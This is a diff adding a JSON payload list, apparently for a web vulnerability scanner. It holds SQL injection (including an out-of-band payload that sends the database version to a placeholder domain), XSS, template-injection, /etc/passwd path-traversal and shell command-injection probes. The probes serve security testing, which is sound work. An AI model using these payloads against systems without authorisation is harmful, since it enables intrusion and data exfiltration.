@@ -1,0 +1,23 @@
+{
+  "sqli": {
+    "error": ["'", "\"", "')", "\")", "';", "\";"],
+    "time": ["' OR SLEEP(5)-- -", "\" OR SLEEP(5)-- -", "'; WAITFOR DELAY '0:0:5'--"],
+    "oob": ["' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT version()),'.{oob_domain}\\test'))-- -"]
+  },
+  "xss": {
+    "reflected": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "javascript:alert(1)"],
+    "polyglot": ["\"'><script>alert(1)</script>", "'><svg/onload=alert(1)>"]
+  },
+  "ssti": {
+    "basic": ["{{7*7}}", "${7*7}", "<%= 7*7 %>"],
+    "time": ["{{'a'.*sleep(5)}}", "{{7*7}}{{''[0].__class__.__mro__[1].__subclasses__()}}"]
+  },
+  "lfi": {
+    "basic": ["../../../etc/passwd", "....//....//....//etc/passwd"],
+    "nullbyte": ["../../../etc/passwd%00"]
+  },
+  "rce": {
+    "basic": [";id", "|id", "`id`", "$(id)"],
+    "time": [";sleep 5", "`sleep 5`"]
+  }
+}
